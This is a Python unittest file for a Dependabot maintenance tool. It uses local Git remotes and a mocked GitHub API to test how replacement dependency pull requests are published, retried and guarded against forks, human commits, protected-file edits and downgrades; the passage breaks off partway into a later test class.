"""Behavioral native lifecycle tests, with isolated Git remotes and API evidence."""

import base64
import copy
import json
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest.mock import patch
from urllib.parse import unquote

import native_dependabot_maintenance as native

REPO = "Azure/ARO-HCP"
PACKAGE = "example.com/library"
OLD = "v1.0.0"
NEW = "v1.1.0"
PIN = "a" * 40
STAMP = "2026-10-01T00:00:00Z"


def git(cwd, *args):
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True, check=True).stdout.strip()


def manifest(version):
    return f"module example.com/component\n\ngo 1.26.0\n\nrequire (\n\t{PACKAGE} {version}\n)\n"


class RepositoryFixture(unittest.TestCase):
    """Fake only the network boundary; Git application and guard logic stay real."""

    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.remote = self.root / "remote.git"
        self.seed = self.root / "seed"
        self.seed.mkdir()
        git(self.root, "init", "--bare", str(self.remote))
        git(self.seed, "init", "-b", "main")
        git(self.seed, "config", "user.name", "Fixture")
        git(self.seed, "config", "user.email", "fixture@example.test")
        self.write("backend/go.mod", manifest(OLD))
        self.write("internal/go.mod", manifest(OLD))
        self.write("vendor/example.com/library/library.go", "package library\nconst Version = 1\n")
        self.write("image-sync/oc-mirror/acrauth/vendor/example.com/library/library.go", "package library\nconst Version = 1\n")
        for prefix in native.VENDORS:
            self.write(prefix + "modules.txt", f"# {PACKAGE} {OLD}\n## explicit; go 1.26.0\n{PACKAGE}\n")
        self.write("api/package.json", json.dumps({"devDependencies": {"prettier": "3.9.9"},
                                                  "overrides": {"undici": "7.30.1"}}, indent=2) + "\n")
        self.write("api/Makefile", "models:\n\t@echo generated\n")
        self.write(".github/workflows/ci.yml", "name: CI\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@" + "b" * 40 + "\n      - run: echo safe\n")
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "base")
        self.base = git(self.seed, "rev-parse", "HEAD")
        git(self.seed, "remote", "add", "origin", str(self.remote))
        git(self.seed, "push", "origin", "main")
        self.pulls = {}
        self.comments = {}
        self.events = {}
        self.statuses = {}
        self.checks = {}
        self.repository_labels = {native.LABEL: {"id": 1, "name": native.LABEL}}
        self.calls = []
        self.next_number = 100
        self.source(1, "backend/go.mod", manifest(NEW))
        self.api_patch = patch.object(native, "api", side_effect=self.api)
        self.api_patch.start()
        self.addCleanup(self.api_patch.stop)
        remote_patch = patch.object(native, "remote_url", return_value=str(self.remote))
        remote_patch.start()
        self.addCleanup(remote_patch.stop)

    def write(self, path, text):
        target = self.seed / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)

    def remote_git(self, *args):
        return git(self.root, "--git-dir", str(self.remote), *args)

    def source(self, number, path, text):
        git(self.seed, "switch", "main")
        git(self.seed, "switch", "-c", f"dependabot/fixture-{number}")
        self.write(path, text)
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "native upgrade")
        sha = git(self.seed, "rev-parse", "HEAD")
        git(self.seed, "push", "origin", f"dependabot/fixture-{number}")
        self.pulls[number] = {"number": number, "state": "open", "merged": False, "draft": False,
                              "title": "Untrusted native title", "body": "Native proposal", "labels": [],
                              "user": {"login": native.NATIVE, "type": "Bot"},
                              "head": {"sha": sha, "ref": f"dependabot/fixture-{number}", "repo": {"full_name": REPO}},
                              "base": {"sha": self.base, "ref": "main", "repo": {"full_name": REPO}}}
        self.comments[number] = []
        self.events[number] = []
        git(self.seed, "switch", "main")
        return sha

    def detail(self, number):
        pull = copy.deepcopy(self.pulls[number])
        if pull["state"] == "open":
            pull["head"]["sha"] = self.remote_git("rev-parse", "refs/heads/" + pull["head"]["ref"])
        pull["base"]["sha"] = self.remote_git("rev-parse", "refs/heads/main")
        base = self.remote_git("merge-base", pull["base"]["sha"], pull["head"]["sha"])
        pull["commits"] = len(self.remote_git("rev-list", f"{base}..{pull['head']['sha']}").splitlines())
        pull["changed_files"] = len(self.files(number))
        pull["comments"] = len(self.comments[number])
        pull["html_url"] = f"https://github.com/{REPO}/pull/{number}"
        return pull

    def files(self, number):
        pull = self.pulls[number]
        head = self.remote_git("rev-parse", "refs/heads/" + pull["head"]["ref"])
        base = self.remote_git("merge-base", "refs/heads/main", head)
        result = []
        for line in self.remote_git("diff", "--name-status", base, head).splitlines():
            state, path = line.split("\t")
            result.append({"filename": path, "status": {"M": "modified", "A": "added", "D": "removed"}[state]})
        return result

    def api(self, endpoint, *, pages=False, method=None, data=None, ci=False):
        self.calls.append((endpoint, method, copy.deepcopy(data)))
        if endpoint == "users/aro-hcp-robot%5Bbot%5D":
            return {"login": native.ROBOT, "type": "Bot", "id": 42}
        prefix = f"repos/{REPO}/"
        if not endpoint.startswith(prefix):
            if "/git/commits/" in endpoint:
                return {"sha": endpoint.rsplit("/", 1)[1]}
            if "/tags?" in endpoint:
                return [[{"name": "v1.2.3", "commit": {"sha": PIN}}]]
            self.fail("unexpected foreign API call " + endpoint)
        path = endpoint[len(prefix):]
        if path.startswith("labels/"):
            name = path.split("/", 1)[1]
            if name not in self.repository_labels:
                raise subprocess.CalledProcessError(1, ["gh", "api"], stderr="gh: Not Found (HTTP 404)")
            return copy.deepcopy(self.repository_labels[name])
        if path == "labels" and method == "POST":
            self.assertEqual(data["name"], native.LABEL)
            if native.LABEL in self.repository_labels:
                raise subprocess.CalledProcessError(1, ["gh", "api"], stderr="gh: Already exists (HTTP 422)")
            self.repository_labels[native.LABEL] = {"id": 1, "name": native.LABEL}
            return copy.deepcopy(self.repository_labels[native.LABEL])
        if path == "git/ref/heads/main":
            return {"object": {"sha": self.remote_git("rev-parse", "refs/heads/main")}}
        if path.startswith("git/trees/"):
            sha = path.split("/")[2].split("?")[0]
            tree = []
            for line in self.remote_git("ls-tree", sha).splitlines():
                mode, kind, rest = line.split(" ", 2)
                entry_sha, filename = rest.split("\t", 1)
                tree.append({"mode": mode, "type": kind, "path": filename, "sha": entry_sha})
            return {"truncated": False, "tree": tree}
        if path.startswith("contents/"):
            filename, sha = path[len("contents/"):].split("?ref=")
            value = self.remote_git("show", f"{sha}:{unquote(filename)}").encode()
            return {"type": "file", "encoding": "base64", "content": base64.b64encode(value).decode(), "size": len(value)}
        if path.startswith("compare/"):
            left, right = path[len("compare/"):].split("...")
            base = self.remote_git("merge-base", left, right)
            return {"merge_base_commit": {"sha": base}, "status": "identical" if left == right else "ahead" if base == left else "diverged"}
        if path.startswith("issues?state="):
            creator = unquote(path.split("creator=")[1].split("&")[0])
            state = path.split("state=")[1].split("&")[0]
            values = [{"number": number, "state": pull["state"], "user": pull["user"], "pull_request": {},
                       "body": pull["body"], "labels": pull["labels"]}
                      for number, pull in self.pulls.items() if pull["user"]["login"] == creator
                      and (state == "all" or pull["state"] == state)]
            return [values[:1], values[1:]] if pages else values
        if path.startswith("pulls/"):
            parts = path.split("/")
            number = int(parts[1])
            if len(parts) == 2:
                if method == "PATCH":
                    self.assertEqual(set(data), {"title", "body"})
                    self.pulls[number].update(data)
                return self.detail(number)
            if parts[2].startswith("files"):
                return [self.files(number)]
            if parts[2].startswith("commits"):
                pull = self.detail(number)
                base = self.remote_git("merge-base", pull["base"]["sha"], pull["head"]["sha"])
                return [[{"sha": sha, "author": {"login": pull["user"]["login"], "type": "Bot"}}
                         for sha in self.remote_git("rev-list", f"{base}..{pull['head']['sha']}").splitlines()]]
        if path == "pulls" and method == "POST":
            number = self.next_number
            self.next_number += 1
            sha = self.remote_git("rev-parse", "refs/heads/" + data["head"])
            self.pulls[number] = {"number": number, "state": "open", "merged": False, "draft": data["draft"],
                                  "title": data["title"], "body": data["body"], "labels": [],
                                  "user": {"login": native.ROBOT, "type": "Bot"},
                                  "head": {"sha": sha, "ref": data["head"], "repo": {"full_name": REPO}},
                                  "base": {"sha": self.base, "ref": "main", "repo": {"full_name": REPO}}}
            self.comments[number], self.events[number] = [], []
            return {"number": number}
        if path.startswith("issues/"):
            number = int(path.split("/")[1])
            if path.endswith("/labels"):
                self.pulls[number]["labels"] = [{"name": label} for label in data["labels"]]
                return self.pulls[number]["labels"]
            if "/comments" in path:
                if method == "POST":
                    comment = {"id": len(self.comments[number]) + 1, "body": data["body"],
                               "user": {"login": native.ROBOT}, "created_at": STAMP, "updated_at": STAMP}
                    self.comments[number].append(comment)
                    return copy.deepcopy(comment)
                return [copy.deepcopy(self.comments[number])]
            if "/events" in path:
                return [copy.deepcopy(self.events[number])]
        if path.startswith("commits/"):
            sha = path.split("/")[1]
            if "/statuses" in path:
                return [copy.deepcopy(self.statuses.get(sha, []))]
            if "/check-runs" in path:
                checks = self.checks.get(sha, [])
                return [{"total_count": len(checks), "check_runs": copy.deepcopy(checks)}]
            return {"sha": sha, "author": {"login": native.ROBOT, "type": "Bot"}}
        self.fail("unexpected API call " + endpoint)

    def upgrade_consumers(self):
        self.write("backend/go.mod", manifest(NEW))
        self.write("internal/go.mod", manifest(NEW))
        for prefix in native.VENDORS:
            self.write(prefix + "modules.txt", f"# {PACKAGE} {NEW}\n## explicit; go 1.26.0\n{PACKAGE}\n")


    def request(self):
        self.upgrade_consumers()
        value = {"source_prs": [{"number": 1, "head_sha": self.pulls[1]["head"]["sha"]}],
                 "expected_base_sha": self.base, "patch": git(self.seed, "diff") + "\n",
                 "title": "chore(deps): upgrade example library (AROSLSRE-2670)",
                 "body": "Regenerated dependency consumers. Source PR #1."}
        git(self.seed, "restore", ".")
        return value

    def action(self, action, number=1, **kwargs):
        return {"number": number, "expected_head_sha": self.detail(number)["head"]["sha"], "action": action, **kwargs}

    def hold(self, number=1, author=native.maintenance.MERGE_BOT, body=None):
        sha = self.detail(number)["head"]["sha"]
        body = body or f"/hold\n\nRevision {sha} was retested 3 times: holding"
        self.comments[number].append({"id": 1, "body": body, "user": {"login": author}, "created_at": STAMP, "updated_at": STAMP})
        self.pulls[number]["labels"].append({"name": native.maintenance.HOLD_LABEL})
        self.events[number].append({"id": 1, "event": "labeled", "label": {"name": native.maintenance.HOLD_LABEL},
                                    "actor": {"login": author}, "created_at": STAMP})

    def ci(self, number=1, *, green=False, pending=False):
        sha = self.detail(number)["head"]["sha"]
        self.statuses[sha] = [{"id": index + 1, "context": name, "state": "success" if green else "pending" if pending else "failure",
                               "created_at": STAMP, "target_url": "https://prow.ci.openshift.org/view/failed"}
                              for index, name in enumerate(("ci/pipeline-gate", "ci/prow/e2e-parallel"))]

    def merge_replacement(self, number):
        branch = self.pulls[number]["head"]["ref"]
        git(self.seed, "fetch", "origin", branch)
        git(self.seed, "merge", "--ff-only", "FETCH_HEAD")
        git(self.seed, "push", "origin", "main")
        self.pulls[number]["head"]["sha"] = git(self.seed, "rev-parse", "HEAD")
        self.pulls[number].update({"state": "closed", "merged": True,
                                   "merge_commit_sha": git(self.seed, "rev-parse", "HEAD")})

    def test_inventory_groups_same_family_across_modules_and_paginates(self):
        self.source(2, "internal/go.mod", manifest(NEW))
        result = native.inventory(REPO)
        self.assertEqual(len(result["groups"]), 1)
        self.assertEqual([row["number"] for row in result["groups"][0]["sources"]], [1, 2])
        self.assertEqual(result["groups"][0]["blockers"], [])
        endpoints = [endpoint for endpoint, _, _ in self.calls if "issues?" in endpoint]
        self.assertTrue(all("creator=" in endpoint for endpoint in endpoints))
        self.assertTrue(any("state=all" in endpoint for endpoint in endpoints))

    def test_publication_cannot_omit_current_same_family_target_native_source(self):
        second_sha = self.source(2, "internal/go.mod", manifest(NEW))
        request = self.request()
        with self.assertRaisesRegex(ValueError, "omits current same-family/target native source #2"):
            native.publish(REPO, request)
        self.assertEqual(self.next_number, 100)
        request["source_prs"].append({"number": 2, "head_sha": second_sha})
        result = native.publish(REPO, request)
        self.assertEqual(native.metadata(self.pulls[result["number"]]["body"])["sources"], request["source_prs"])

    def test_prettier_publication_preserves_mixed_major_parent_scoped_overrides(self):
        manifest_before = {"devDependencies": {"prettier": "3.9.9"},
                           "overrides": {"js-yaml@^3": "^3.15.2", "js-yaml@^4": "^4.3.2",
                                         "ajv@>=7.0.0-alpha.0": "^8.18.0",
                                         "minimatch": "^3.1.3",
                                         "oav": {"ajv": "^6.12.6", "@apidevtools/swagger-parser": {"ajv": "^8.18.0"}}}}
        versions = {"prettier": "3.9.9", "js-yaml": "4.3.2", "ajv": "8.18.0",
                    "oav": "4.0.4", "@apidevtools/swagger-parser": "12.0.0",
                    "minimatch": "3.1.5", "glob": "13.0.0", "glob/node_modules/minimatch": "10.2.5",
                    "oav/node_modules/ajv": "6.12.6", "oav/node_modules/js-yaml": "3.15.2"}
        lock_before = {"lockfileVersion": 3, "packages": {
            "node_modules/" + name: {"version": version} for name, version in versions.items()}}
        self.write("api/package.json", json.dumps(manifest_before, indent=2) + "\n")
        self.write("api/package-lock.json", json.dumps(lock_before, indent=2) + "\n")
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "trusted mixed override scopes")
        git(self.seed, "push", "origin", "main")
        self.base = git(self.seed, "rev-parse", "HEAD")
        manifest_after = copy.deepcopy(manifest_before)
        manifest_after["devDependencies"]["prettier"] = "3.9.10"
        source_sha = self.source(2, "api/package.json", json.dumps(manifest_after, indent=2) + "\n")
        lock_after = copy.deepcopy(lock_before)
        lock_after["packages"]["node_modules/prettier"]["version"] = "3.9.11"
        self.write("api/package.json", json.dumps(manifest_after, indent=2) + "\n")
        self.write("api/package-lock.json", json.dumps(lock_after, indent=2) + "\n")
        request = {"source_prs": [{"number": 2, "head_sha": source_sha}],
                   "expected_base_sha": self.base, "patch": git(self.seed, "diff") + "\n",
                   "title": "chore(deps): update prettier", "body": "Regenerated npm lock with preserved overrides."}
        git(self.seed, "restore", ".")
        result = native.publish(REPO, request)
        self.assertEqual(native.metadata(self.pulls[result["number"]]["body"])["sources"], request["source_prs"])
        self.assertIn('"version": "6.12.6"', self.remote_git("show", result["head_sha"] + ":api/package-lock.json"))
        # A numerically higher AJV is still wrong inside oav's scoped v6 override.
        lock_after["packages"]["node_modules/oav/node_modules/ajv"]["version"] = "8.18.0"
        self.write("api/package.json", json.dumps(manifest_after, indent=2) + "\n")
        self.write("api/package-lock.json", json.dumps(lock_after, indent=2) + "\n")
        request["patch"] = git(self.seed, "diff") + "\n"
        git(self.seed, "restore", ".")
        with self.assertRaisesRegex(ValueError, "security override scope"):
            native.publish(REPO, request)
        self.assertEqual(self.detail(result["number"])["head"]["sha"], result["head_sha"])

    def test_same_family_identity_survives_new_target_and_source_revision(self):
        original = native.source_intent(REPO, native.snapshot(REPO, 1, self.detail(1)["head"]["sha"]))
        git(self.seed, "switch", self.pulls[1]["head"]["ref"])
        self.write("backend/go.mod", manifest("v1.2.0"))
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "new upstream target")
        git(self.seed, "push", "origin", self.pulls[1]["head"]["ref"])
        git(self.seed, "switch", "main")
        updated = native.source_intent(REPO, native.snapshot(REPO, 1, self.detail(1)["head"]["sha"]))
        self.assertEqual(updated["group"], original["group"])
        self.assertNotEqual(updated["target"], original["target"])

    def test_publish_applies_real_patch_and_reuses_branch_without_history_rewrite(self):
        request = self.request()
        first = native.publish(REPO, request)
        second = native.publish(REPO, request)
        self.assertEqual(first["number"], second["number"])
        self.assertEqual(first["head_sha"], second["head_sha"])
        self.assertTrue(second["unchanged"])
        self.assertEqual(self.remote_git("rev-parse", first["head_sha"] + "^"), self.base)
        self.assertIn(NEW, self.remote_git("show", first["head_sha"] + ":backend/go.mod"))
        self.assertEqual(self.next_number, 101)
        self.assertEqual(native.metadata(self.pulls[100]["body"])["sources"], request["source_prs"])
        self.assertEqual(self.comments[1], [])

    def test_first_publication_creates_fixed_missing_label_before_any_branch_or_pr(self):
        self.repository_labels.clear()
        original = self.api
        def with_publication_boundary(endpoint, **kwargs):
            if endpoint == f"repos/{REPO}/labels" and kwargs.get("method") == "POST":
                self.assertEqual(self.next_number, 100)
                self.assertEqual(self.remote_git("for-each-ref", "--format=%(refname)",
                                                "refs/heads/native-dependabot-"), "")
            return original(endpoint, **kwargs)
        with patch.object(native, "api", side_effect=with_publication_boundary):
            result = native.publish(REPO, self.request())
        self.assertEqual(result["number"], 100)
        self.assertIn(native.LABEL, self.repository_labels)
        self.assertIn(native.LABEL, {label["name"] for label in self.pulls[100]["labels"]})

    def test_failed_create_replays_exact_authenticated_branch_without_new_commit(self):
        request = self.request()
        original = self.api
        def failed_create(endpoint, **kwargs):
            if endpoint == f"repos/{REPO}/pulls" and kwargs.get("method") == "POST":
                raise subprocess.CalledProcessError(1, ["gh", "api"])
            return original(endpoint, **kwargs)
        with patch.object(native, "api", side_effect=failed_create), self.assertRaises(subprocess.CalledProcessError):
            native.publish(REPO, request)
        branch = "native-dependabot-" + native.sources_group(REPO, request["source_prs"])["group"]
        old = self.remote_git("rev-parse", "refs/heads/" + branch)
        result = native.publish(REPO, request)
        self.assertEqual(result["head_sha"], old)
        self.assertTrue(result["unchanged"])
        self.assertEqual(self.next_number, 101)

    def test_failed_label_replays_existing_publication_window_without_new_pr(self):
        request = self.request()
        original = self.api
        def failed_label(endpoint, **kwargs):
            if endpoint.endswith("/labels") and kwargs.get("method") == "POST":
                raise subprocess.CalledProcessError(1, ["gh", "api"])
            return original(endpoint, **kwargs)
        with patch.object(native, "api", side_effect=failed_label), self.assertRaises(subprocess.CalledProcessError):
            native.publish(REPO, request)
        self.assertEqual(self.next_number, 101)
        self.assertTrue(native.inventory(REPO)["replacements"][0]["publication_pending"])
        first = self.detail(100)["head"]["sha"]
        result = native.publish(REPO, request)
        self.assertEqual(result["number"], 100)
        self.assertEqual(result["head_sha"], first)
        self.assertIn(native.LABEL, {row["name"] for row in self.pulls[100]["labels"]})
        self.assertEqual(self.next_number, 101)

    def next_family_upgrade(self):
        first = native.publish(REPO, self.request())
        self.merge_replacement(first["number"])
        self.write("main-only.txt", "unrelated intervening trusted main change\n")
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "main advances after family merge")
        git(self.seed, "push", "origin", "main")
        self.base = git(self.seed, "rev-parse", "HEAD")
        target = "v1.2.0"
        sha = self.source(2, "backend/go.mod", manifest(target))
        self.write("backend/go.mod", manifest(target))
        self.write("internal/go.mod", manifest(target))
        for prefix in native.VENDORS:
            self.write(prefix + "modules.txt", f"# {PACKAGE} {target}\n## explicit; go 1.26.0\n{PACKAGE}\n")
        request = {"source_prs": [{"number": 2, "head_sha": sha}],
                   "expected_base_sha": self.base, "patch": git(self.seed, "diff") + "\n",
                   "title": "chore(deps): next library release", "body": "Regenerated next native dependency upgrade."}
        git(self.seed, "restore", ".")
        return first, request

    def test_new_family_target_reuses_retained_merged_branch_with_safe_ancestry(self):
        first, request = self.next_family_upgrade()
        result = native.publish(REPO, request)
        self.assertNotEqual(result["number"], first["number"])
        self.assertFalse(result["reused"])
        self.assertEqual(self.pulls[result["number"]]["head"]["ref"], self.pulls[first["number"]]["head"]["ref"])
        self.assertEqual(self.remote_git("show", "-s", "--format=%P", result["head_sha"]).split(),
                         [first["head_sha"], self.base])
        self.assertEqual(self.pulls[first["number"]]["state"], "closed")
        self.assertEqual(native.metadata(self.pulls[first["number"]]["body"])["sources"][0]["number"], 1)
        self.assertEqual(native.metadata(self.pulls[result["number"]]["body"])["sources"][0]["number"], 2)

    def test_recurring_failed_create_replays_two_parent_publication_without_churn(self):
        first, request = self.next_family_upgrade()
        original = self.api
        def failed_create(endpoint, **kwargs):
            if endpoint == f"repos/{REPO}/pulls" and kwargs.get("method") == "POST":
                raise subprocess.CalledProcessError(1, ["gh", "api"])
            return original(endpoint, **kwargs)
        with patch.object(native, "api", side_effect=failed_create), self.assertRaises(subprocess.CalledProcessError):
            native.publish(REPO, request)
        branch = self.pulls[first["number"]]["head"]["ref"]
        orphan = self.remote_git("rev-parse", "refs/heads/" + branch)
        self.assertEqual(self.remote_git("show", "-s", "--format=%P", orphan).split(),
                         [first["head_sha"], self.base])
        result = native.publish(REPO, request)
        self.assertEqual(result["head_sha"], orphan)
        self.assertTrue(result["unchanged"])
        self.assertEqual(self.next_number, 102)

    def test_closed_unmerged_branch_is_not_reopened_or_taken_over(self):
        request = self.request()
        first = native.publish(REPO, request)
        self.pulls[first["number"]]["state"] = "closed"
        with self.assertRaisesRegex(ValueError, "closed-unmerged"):
            native.publish(REPO, request)
        self.assertEqual(self.next_number, 101)
        self.assertEqual(self.remote_git("rev-parse", "refs/heads/" + self.pulls[first["number"]]["head"]["ref"]),
                         first["head_sha"])

    def test_retained_branch_requires_proven_merged_commit_on_current_main(self):
        first, request = self.next_family_upgrade()
        self.pulls[first["number"]]["merge_commit_sha"] = self.pulls[1]["head"]["sha"]
        with self.assertRaisesRegex(ValueError, "not an ancestor"):
            native.publish(REPO, request)
        self.assertEqual(self.next_number, 101)

    def test_stale_native_target_never_downgrades_current_go_family(self):
        for number, target, current in ((2, "v1.18.4", "v1.19.0"),
                                        (3, "v3.0.0-beta.3", "v3.0.0-beta.4")):
            source_sha = self.source(number, "backend/go.mod", manifest(target))
            for path in ("backend/go.mod", "internal/go.mod"):
                self.write(path, manifest(current))
            for prefix in native.VENDORS:
                self.write(prefix + "modules.txt", f"# {PACKAGE} {current}\n## explicit; go 1.26.0\n{PACKAGE}\n")
            git(self.seed, "add", ".")
            git(self.seed, "commit", "-m", "main already selects a higher family release")
            git(self.seed, "push", "origin", "main")
            self.base = git(self.seed, "rev-parse", "HEAD")
            for path in ("backend/go.mod", "internal/go.mod"):
                self.write(path, manifest(target))
            for prefix in native.VENDORS:
                self.write(prefix + "modules.txt", f"# {PACKAGE} {target}\n## explicit; go 1.26.0\n{PACKAGE}\n")
            request = {"source_prs": [{"number": number, "head_sha": source_sha}],
                       "expected_base_sha": self.base, "patch": git(self.seed, "diff") + "\n",
                       "title": "chore(deps): stale native release", "body": "Attempted stale dependency selection."}
            git(self.seed, "restore", ".")
            with self.subTest(target=target), self.assertRaisesRegex(ValueError, "current-base family"):
                native.publish(REPO, request)
            self.assertEqual(self.next_number, 100)

    def test_existing_replacement_fast_forward_preserves_old_head(self):
        request = self.request()
        first = native.publish(REPO, request)
        self.upgrade_consumers()
        self.write("vendor/example.com/library/library.go", "package library\nconst Version = 3\n")
        request["patch"] = git(self.seed, "diff") + "\n"
        git(self.seed, "restore", ".")
        second = native.publish(REPO, request)
        self.assertEqual(second["number"], first["number"])
        self.assertNotEqual(second["head_sha"], first["head_sha"])
        self.assertEqual(self.remote_git("rev-parse", second["head_sha"] + "^1"), first["head_sha"])

    def test_stale_main_or_source_denies_publication_before_branch_write(self):
        for field in ("expected_base_sha", "source_prs"):
            request = self.request()
            if field == "source_prs":
                request[field][0]["head_sha"] = "f" * 40
            else:
                request[field] = "f" * 40
            with self.subTest(field=field), self.assertRaises(ValueError):
                native.publish(REPO, request)
        self.assertEqual(self.remote_git("for-each-ref", "--format=%(refname)", "refs/heads/native-dependabot-"), "")
        self.assertEqual(self.next_number, 100)

    def test_foreign_fork_author_or_human_hold_cannot_publish_or_admit(self):
        original = copy.deepcopy(self.pulls[1])
        changes = [("user", {"login": "human", "type": "User"}),
                   ("head", {**original["head"], "repo": {"full_name": "foreign/fork"}})]
        for key, value in changes:
            self.pulls[1] = {**copy.deepcopy(original), key: value}
            with self.subTest(key=key), self.assertRaises(ValueError):
                native.publish(REPO, self.request())
        self.pulls[1] = original
        self.hold(author="human", body="/hold awaiting manual review")
        with self.assertRaisesRegex(ValueError, "human/unknown"):
            native.publish(REPO, self.request())
        with self.assertRaisesRegex(ValueError, "human/unknown"):
            native.reconcile(REPO, self.action("admit"))
        self.assertEqual(len(self.comments[1]), 1)

    def test_protected_patch_is_rejected_and_remote_unchanged(self):
        request = self.request()
        self.write("backend/go.mod", manifest(NEW))
        self.write(".github/workflows/ci.yml", "name: unsafe\njobs: {}\n")
        request["patch"] = git(self.seed, "diff") + "\n"
        git(self.seed, "restore", ".")
        with self.assertRaisesRegex(ValueError, "protected"):
            native.publish(REPO, request)
        self.assertEqual(self.next_number, 100)

    def test_safe_native_admission_is_fixed_command_and_idempotent(self):
        old = (self.seed / ".github/workflows/ci.yml").read_text()
        self.source(2, ".github/workflows/ci.yml", old.replace("b" * 40, PIN))
        first = native.reconcile(REPO, self.action("admit", number=2))
        second = native.reconcile(REPO, self.action("admit", number=2))
        self.assertEqual(first["status"], "requested")
        self.assertEqual(second["status"], "already-admitted")
        self.assertEqual(len(self.comments[2]), 1)
        self.assertEqual(self.comments[2][0]["body"].splitlines()[-1], "/ok-to-test")

    def test_manifest_only_go_and_npm_native_prs_need_replacement_not_admission(self):
        with self.assertRaisesRegex(ValueError, "workspace/vendor"):
            native.reconcile(REPO, self.action("admit"))
        before = (self.seed / "api/package.json").read_text()
        self.source(2, "api/package.json", before.replace("3.9.9", "3.9.10"))
        with self.assertRaisesRegex(ValueError, "updated lock"):
            native.reconcile(REPO, self.action("admit", number=2))
        self.assertEqual(self.comments[1], [])
        self.assertEqual(self.comments[2], [])

    def test_retry_requires_causal_evidence_and_is_bounded_per_head(self):
        self.hold()
        self.ci()
        evidence = "Resolved transient infrastructure issue; failed https://prow.ci.openshift.org/view/failed now succeeds in https://prow.ci.openshift.org/view/comparison."
        with self.assertRaises(ValueError):
            native.reconcile(REPO, self.action("recover-retry", evidence="try again"))
        result = native.reconcile(REPO, self.action("recover-retry", evidence=evidence))
        self.assertEqual(result["status"], "requested")
        self.assertTrue(self.comments[1][-1]["body"].endswith("/hold cancel\n/retest-required"))
        with self.assertRaises(ValueError):
            native.reconcile(REPO, self.action("recover-retry", evidence=evidence))
        self.assertEqual(len(self.comments[1]), 2)

    def test_pending_ci_and_unexplained_hold_preserve_retry_budget(self):
        self.hold()
        self.ci(pending=True)
        evidence = "Resolved transient infrastructure failure https://prow.ci.openshift.org/view/failed; comparison https://prow.ci.openshift.org/view/comparison."
        with self.assertRaisesRegex(ValueError, "pending"):
            native.reconcile(REPO, self.action("recover-retry", evidence=evidence))
        self.assertEqual(len(self.comments[1]), 1)
        self.comments[1][0]["body"] = "/hold unexplained"
        self.ci(green=True)
        with self.assertRaisesRegex(ValueError, "human/unknown"):
            native.reconcile(REPO, self.action("release-hold"))

    def test_green_release_and_robot_replacement_recovery_use_distinct_identity(self):
        result = native.publish(REPO, self.request())
        self.hold(number=result["number"])
        self.ci(number=result["number"], green=True)
        native.reconcile(REPO, self.action("release-hold", number=result["number"]))
        self.assertEqual(self.comments[result["number"]][-1]["body"], "/hold cancel")
        self.assertIsNone(native.maintenance.owned_kind(self.detail(result["number"]), REPO))
        with self.assertRaises(ValueError):
            native.reconcile(REPO, self.action("admit", number=result["number"]))

    def test_unmerged_replacement_never_closes_native_source(self):
        result = native.publish(REPO, self.request())
        with self.assertRaises(ValueError):
            native.reconcile(REPO, self.action("close-superseded", replacement_pr=result["number"]))
        self.assertEqual(self.comments[1], [])

    def test_merged_coverage_closes_only_via_prow_command_and_inventory_finds_merge(self):
        result = native.publish(REPO, self.request())
        self.merge_replacement(result["number"])
        inventory = native.inventory(REPO)
        self.assertTrue(inventory["replacements"][0]["merged"])
        native.reconcile(REPO, self.action("close-superseded", replacement_pr=result["number"]))
        self.assertTrue(self.comments[1][-1]["body"].endswith("\n/close"))
        self.assertEqual(self.pulls[1]["state"], "open")
        self.assertFalse(any(method == "PATCH" and data.get("state") == "closed"
                             for _, method, data in self.calls if isinstance(data, dict)))

    def test_merged_marker_and_shared_manifest_are_not_coverage(self):
        result = native.publish(REPO, self.request())
        self.merge_replacement(result["number"])
        self.write("backend/go.mod", manifest(OLD))
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "revert actual dependency")
        git(self.seed, "push", "origin", "main")
        with self.assertRaisesRegex(ValueError, "not covered"):
            native.reconcile(REPO, self.action("close-superseded", replacement_pr=result["number"]))
        self.assertEqual(self.comments[1], [])

    def test_partial_api_history_and_api_errors_are_not_empty_inventory(self):
        original = self.api
        def partial(endpoint, **kwargs):
            if "/pulls/1/commits?" in endpoint:
                return [[]]
            return original(endpoint, **kwargs)
        with patch.object(native, "api", side_effect=partial):
            result = native.inventory(REPO)
            self.assertTrue(result["groups"][0]["blockers"])
            with self.assertRaisesRegex(ValueError, "commit evidence"):
                native.reconcile(REPO, self.action("admit"))
        with patch.object(native, "api", side_effect=subprocess.CalledProcessError(1, ["gh", "api"])):
            with self.assertRaises(subprocess.CalledProcessError):
                native.inventory(REPO)

    def test_vendor_consumers_are_published_but_not_executed(self):
        request = self.request()
        self.upgrade_consumers()
        for prefix in native.VENDORS:
            self.write(prefix + "example.com/library/library.go", "package library\nconst Version = 2\n")
            self.write(prefix + "example.com/library/new.go", "package library\n// regenerated\n")
        git(self.seed, "add", ".")
        request["patch"] = git(self.seed, "diff", "--cached") + "\n"
        git(self.seed, "restore", "--staged", ".")
        git(self.seed, "restore", ".")
        for prefix in native.VENDORS:
            (self.seed / (prefix + "example.com/library/new.go")).unlink()
        result = native.publish(REPO, request)
        for prefix in native.VENDORS:
            self.assertIn("regenerated", self.remote_git("show", result["head_sha"] + ":" + prefix + "example.com/library/new.go"))

    def test_native_author_does_not_authorize_human_commits_on_its_branch(self):
        original = self.api
        def changed_author(endpoint, **kwargs):
            result = original(endpoint, **kwargs)
            if "/pulls/1/commits?" in endpoint:
                result[0][0]["author"] = {"login": "human", "type": "User"}
            return result
        with patch.object(native, "api", side_effect=changed_author), self.assertRaisesRegex(ValueError, "non-Dependabot"):
            native.publish(REPO, self.request())
        self.assertEqual(self.next_number, 100)


class EvidenceTests(unittest.TestCase):
    def test_output_accepts_actual_flattened_and_nested_envelopes_but_not_ambiguity(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "output.json"
            for envelope in ({"type": "native_action", "request": '{"action":"admit"}'},
                             {"type": "native_action", "data": {"request": '{"action":"admit"}'}}):
